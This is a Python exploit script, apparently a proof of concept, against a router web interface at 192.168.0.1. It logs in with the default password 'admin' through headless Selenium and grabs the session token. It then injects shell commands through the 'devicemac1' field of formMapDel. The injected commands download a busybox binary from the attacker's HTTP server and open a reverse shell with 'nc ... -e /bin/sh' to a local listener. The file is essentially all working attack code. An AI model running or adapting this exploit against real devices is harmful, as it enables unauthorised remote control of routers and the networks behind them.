import requests
import time
import subprocess
from pwn import *
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.options import Options
from webdriver_manager.chrome import ChromeDriverManager


sessionId = ""

def getSessionId():
    global sessionId


    options = Options()
    options.add_argument("--headless=new")
    options.add_argument("--disable-dev-shm-usage")
    options.add_argument("--disable-gpu")
    options.add_argument("--window-size=1920x1080")
    driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=options)
    login_url = "http://192.168.0.1/login.htm"

    driver.get(login_url)

    password_input = driver.find_element(By.NAME, 'password')
    password_input.send_keys("admin")
    password_input.send_keys(Keys.RETURN)
    time.sleep(2)
    driver.get('http://192.168.0.1/urlfilter.htm')
    sessionCheck_element = driver.find_element(By.NAME, "sessionCheck")
    sessionId = sessionCheck_element.get_attribute("value")


    driver.quit()
    print(f'session:{sessionId}')

def attack():
    global sessionId
    server_process = subprocess.Popen(['python3', '-m', 'http.server'])
    nc_process = subprocess.Popen(['nc', '-lvnp', '2333'])

    url = 'http://192.168.0.1/boafrm/formMapDel'
    headers = {
        'Host': '192.168.0.1',
        'Cache-Control': 'max-age=0',
        'Accept-Language': 'en-US,en;q=0.9',
        'Origin': 'http://192.168.0.1',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Upgrade-Insecure-Requests': '1',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Referer': 'http://192.168.0.1/',
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive'
    }

    data = {
        "sessionCheck": sessionId,
        "submit-url": "",
        "deviceNum": "1",
        "enabled1": "ON",
        "devicemac1": "; wget http://192.168.0.2:8000/busybox-mipsel; sleep 5; chmod 777 ./busybox-mipsel; ./busybox-mipsel nc 192.168.0.2 2333 -e /bin/sh; #"
    }
    response = requests.post(url, headers=headers, data=data)

    try:
        nc_process.wait()
    except KeyboardInterrupt:
        nc_process.terminate()
        server_process.terminate()


def main():
    getSessionId()
    attack()
if __name__ == '__main__':
    main()
